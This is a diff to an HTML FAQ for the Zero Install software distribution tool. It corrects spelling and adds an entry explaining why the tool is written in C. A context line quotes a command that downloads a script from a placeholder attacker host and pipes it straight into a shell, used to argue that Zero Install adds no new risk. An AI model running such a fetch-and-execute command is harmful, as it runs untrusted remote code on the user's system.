@@ -300,11 +300,11 @@ $ lynx -source http://evil.com | sh -
 <p>
 Both can do exactly the same amount of damage, but the second works on any
 system. Zero Install helps with large, complicated programs with lots of
-dependancies, whereas your typical malicious program is only a few lines long,
+dependencies, whereas your typical malicious program is only a few lines long,
 and doesn't benefit from it.
 </p>
 
-<h3>But what about kernel bugs? Zero Install is still vunerable then!</h3>
+<h3>But what about kernel bugs? Zero Install is still vulnerable then!</h3>
 
 <p>
 Recently, a bug was found (and fixed) in the Linux kernel that allowed any user
@@ -317,6 +317,38 @@ took advantage of this bug to break an un-patched machine?
 Well, yes. But, as with the question above, they could do it just as easily
 without Zero Install (using wget, or just by typing the program in themselves).
 If your kernel is insecure, you have a problem with or without Zero Install.
+</p>
+
+<h3>Why is it written in C?</h3>
+
+<p>
+Actually, this isn't a FAQ, but it should be. Zero Install itself is fairly
+security-critical (it doesn't run as root or accept incoming connections, but
+an exploit would allow a local attacker to trojan other users' software). It
+isn't speed critical, however; it only gets invoked when something isn't in the
+cache, in which case it has to do a network fetch anyway. Given C's lack of
+buffer-overflow checking, it seems a poor choice of language.
+</p>
+
+<p>
+I actually looked at quite a few languages. The problem is that I wanted
+it to be runnable from a boot floppy, which means the binary has to be
+<i>small</i>. And, incredibly, there seems to be no decent language capable
+of producing small stand-alone binaries. I thought C was bloated when I
+couldn't get "Hello World" under about 700 bytes (and the naive implementation
+is closer to 3K), but most languages can't seem to manage under a meg for
+the same thing. Python's great, of course, but it needs a huge runtime
+(likewise for Java, etc). The best language I could see for this was the
+<a href="http://www.digitalmars.com/d/index.html">D Programming Language</a>
+(which still manages a ridiculous 60K for a program that does nothing), but
+expecting people to install a D compiler isn't going to help adoption, and it's
+not portable (or rather, D code is, but the compiler isn't yet).
+</p>
+
+<p>
+The solution may be to have two implementations of zero-install; one written
+in C to be small for boot-strapping, and one written in
+Python/D/scheme/whatever for larger systems.
 </p>
 
 <h3>What was the inspiration for Zero Install?</h3>
